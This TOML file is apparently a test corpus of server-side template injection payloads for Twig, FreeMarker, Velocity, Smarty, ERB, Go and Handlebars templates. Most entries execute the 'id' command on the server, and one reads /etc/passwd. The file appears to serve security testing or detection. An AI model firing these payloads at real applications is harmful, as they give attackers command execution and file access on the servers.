schema = 1
# Twig (PHP), FreeMarker (Java), Velocity (Java), Smarty (PHP), ERB (Ruby), Go.

# Twig
[[case]]
id = "twig_arith"
class = "ssti"
payload = "{{7*'7'}}"

[[case]]
id = "twig_filter_exec"
class = "ssti"
payload = "{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}"

[[case]]
id = "twig_attr_dump"
class = "ssti"
payload = "{{ dump(_self) }}"

[[case]]
id = "twig_app_request"
class = "ssti"
payload = "{{ app.request.server.all|join(',') }}"

# FreeMarker
[[case]]
id = "freemarker_exec_new"
class = "ssti"
payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"

[[case]]
id = "freemarker_objectconstructor"
class = "ssti"
payload = "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",[\"id\"]).start()}"

[[case]]
id = "freemarker_assign_keep"
class = "ssti"
payload = "<#assign classloader=object?api.class.protectionDomain.classLoader>"

# Velocity
[[case]]
id = "velocity_runtime_exec"
class = "ssti"
payload = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($p=$rt.getMethod('exec',$x.class).invoke($rt.getMethod('getRuntime').invoke(null),'id'))"

[[case]]
id = "velocity_set_eval"
class = "ssti"
payload = "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\")"

# Smarty
[[case]]
id = "smarty_php_block"
class = "ssti"
payload = "{php}echo `id`;{/php}"

[[case]]
id = "smarty_self_template"
class = "ssti"
payload = "{self::call_user_func_array(\"system\",[\"id\"])}"

# ERB / Ruby
[[case]]
id = "erb_exec_backtick"
class = "ssti"
payload = "<%= `id` %>"

[[case]]
id = "erb_eval"
class = "ssti"
payload = "<%= system('id') %>"

[[case]]
id = "erb_open"
class = "ssti"
payload = "<%= IO.popen('id').read %>"

# Go templates
[[case]]
id = "go_print"
class = "ssti"
payload = "{{print \"hi\"}}"

[[case]]
id = "go_call"
class = "ssti"
payload = "{{call .OS.Open \"/etc/passwd\"}}"

# Handlebars (JavaScript)
[[case]]
id = "handlebars_constructor"
class = "ssti"
payload = "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id')\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
